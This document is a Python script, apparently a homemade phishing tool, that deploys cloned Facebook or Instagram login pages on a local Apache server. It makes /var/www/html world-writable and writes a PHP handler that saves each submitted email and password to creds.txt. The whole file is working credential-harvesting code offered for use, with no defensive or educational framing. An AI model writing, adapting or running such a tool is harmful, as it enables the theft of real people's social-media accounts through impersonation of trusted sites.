#! usr/bin/python3
import subprocess
import time

#create an ascii Banner
def banner():
    subprocess.call(["clear"])
    print(""""          
                               .__    .__       .__                
                        ______ |  |__ |__| _____|__| ____    ____  
                        \____ \|  |  \|  |/  ___/  |/    \  / ___\ 
                        |  |_> >   Y  \  |\___ \|  |   |  \/ /_/  >
                        |   __/|___|  /__/____  >__|___|  /\___  / 
                        |__|        \/        \/        \//_____/  
              
              """)
    #creting the php page to extract data
def create_post():

    subprocess.call(["chmod", "777", "/var/www/html"])

    f = open('post.php', 'a')
    f.write("""
        <?php     
                $file = fopen('/var/www/html/creds.txt','a');
                fwrite($file,$_POST['email'] . ":" . $_POST['pass']);
                fclose($file);
        ?>

        """)
    f.close()


    #start the phishing attack
def start_facebook():
    print("[+] Setting up some stuffs....")
    time.sleep(10)
    #calling up the php file
    create_post()
    #setting up commands
    subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/sites/facebook/index_files", "/var/www/html"])
    subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/sites/facebook/index.html", "/var/www/html"])
    subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/post.php", "/var/www/html"])
    #start apache server
    subprocess.call(["service","apache2","start"])
    print("[+]Starting attack on port 80")
    print("[+]Website....www.facebook.com")
def start_instagram():
    print("[+] Setting up some stuffs....")
    time.sleep(10)
    # calling up the php file
    create_post()
    subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/sites/instagram/index_files", "/var/www/html"])
    subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/sites/instagram/index.html", "/var/www/html"])
    subprocess.call(["cp", "-r", "/root/PycharmProjects/phishing/post.php", "/var/www/html"])
    #start apache server
    subprocess.call(["service","apache2","start"])
    print("[+]Starting attack on port 80")
    print("[+]Website....www.instagram.com")


def get_input():
    print("""                      Enter the site to perform the cloning
                                    1.Facebook
                                    2.Instagram""")
    a = int(input())
    return a

#initiate the phishing attack
banner()
value = get_input()
if value == 1:
    start_facebook()
elif value == 2:
    start_instagram()
else:
    print("Enter valid input")


